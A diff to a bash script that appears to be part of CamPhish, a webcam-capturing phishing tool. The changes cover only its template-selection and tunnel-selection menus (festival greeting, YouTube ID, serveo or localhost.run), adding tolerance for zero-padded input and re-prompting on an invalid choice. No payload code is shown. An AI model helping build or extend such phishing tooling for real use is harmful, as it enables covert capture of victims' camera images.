@@ -266,14 +266,24 @@ select_template() {
     read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Choose template: [Default 1] \e[0m' option_tem
     option_tem="${option_tem:-1}"
     case "$option_tem" in
-          1) read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter festival name: \e[0m' fest_name;
+        1|01) read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter festival name: \e[0m' fest_name;
               fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
               read -p $'\e[1;92m[\e[0m+\e[1;92m] Choose style: 1)Indian  2)Islamic: [Default 1] \e[0m' fest_variant
-              fest_variant="${fest_variant:-1}" ;;
-        2) read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter YouTube video ID: \e[0m' yt_video_ID ;;
-        3) : ;;
+              fest_variant="${fest_variant:-1}"
+              case "$fest_variant" in
+                  1|01|2|02) ;;
+                  *) printf "\e[1;93m[!] Invalid style option!\e[0m\n"; sleep 1
+                     read -p $'\e[1;92m[\e[0m+\e[1;92m] Choose style: 1)Indian  2)Islamic: [Default 1] \e[0m' fest_variant
+                     fest_variant="${fest_variant:-1}" ;;
+              esac
+              # normalize to plain digit
+              fest_variant="${fest_variant#0}" ;;
+        2|02) read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter YouTube video ID: \e[0m' yt_video_ID ;;
+        3|03) : ;;
         *) printf "\e[1;93m[!] Invalid option!\e[0m\n"; sleep 1; select_template ;;
     esac
+    # normalize option_tem to plain digit for payload_template comparisons
+    option_tem="${option_tem#0}"
 }
 camphish() {
     if [[ -f ".monitor_pid" ]]; then
@@ -289,8 +299,8 @@ camphish() {
     option_server="${option_server:-1}"
     select_template
     case "$option_server" in
-        1) serveo_tunnel ;;
-        2) localhost_run_tunnel ;;
+        1|01) serveo_tunnel ;;
+        2|02) localhost_run_tunnel ;;
         *) printf "\e[1;93m[!] Invalid option!\e[0m\n"; sleep 1; camphish ;;
     esac
 }
